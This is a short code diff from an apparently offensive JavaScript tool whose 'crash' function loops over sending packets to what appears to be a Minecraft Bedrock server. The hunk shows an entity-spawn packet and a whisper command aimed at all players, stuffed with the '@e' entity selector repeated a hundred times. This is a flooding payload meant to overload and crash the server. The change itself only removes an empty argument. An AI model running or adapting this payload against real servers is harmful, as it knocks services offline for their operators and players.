@@ -80,7 +80,7 @@ const crash = async (options) => {
                     extra_data: -1124852450,
                     is_baby_mob: false,
                 });
-                runCommand(client, `w @a ${"@e".repeat(10).repeat(10)}`, ``);
+                runCommand(client, `w @a ${"@e".repeat(10).repeat(10)}`);
                 i++;
                 if (delay) await wait(options.delay);
             }
